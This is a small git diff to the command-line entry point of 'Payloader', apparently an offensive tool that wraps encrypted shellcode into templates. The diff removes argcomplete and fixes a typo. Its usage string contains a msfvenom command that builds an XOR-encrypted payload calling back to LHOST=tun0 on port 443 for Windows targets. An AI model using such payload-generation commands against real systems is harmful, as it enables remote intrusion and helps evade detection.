@@ -4,14 +4,13 @@ import argparse
 import sys
 import os
 
-import argcomplete
 
 from generator import Generator
 
 
 def main():
     parser = argparse.ArgumentParser(description='Payloader - A simple tool to generate payloads', add_help=True,
-                                     prog='payloader', usage='%(prog)s template [options] < payload\nmsfvenom -p <payload> LHOST=tun0 LPORT=443 --encrypt xor --encrypt-key key -f <matching format> | layloader <template> -a amd64 -p win -e xor -k wh1rl3y')
+                                     prog='payloader', usage='%(prog)s template [options] < payload\nmsfvenom -p <payload> LHOST=tun0 LPORT=443 --encrypt xor --encrypt-key key -f <matching format> | payloader <template> -a amd64 -p win -e xor -k wh1rl3y')
     parser.add_argument('template', help='Template name')
     parser.add_argument('--platform', '-p', choices=['win', 'nix'], help='Target platform')
     parser.add_argument('--architecture', '-a', choices=['x64', 'x86', 'arm64', 'arm'],
@@ -29,7 +28,6 @@ def main():
     parser.add_argument('--version', action='version', version='%(prog)s 1.0')
     parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
 
-    argcomplete.autocomplete(parser)
 
     if '--list' in sys.argv or '-l' in sys.argv:
         Generator.list_templates()
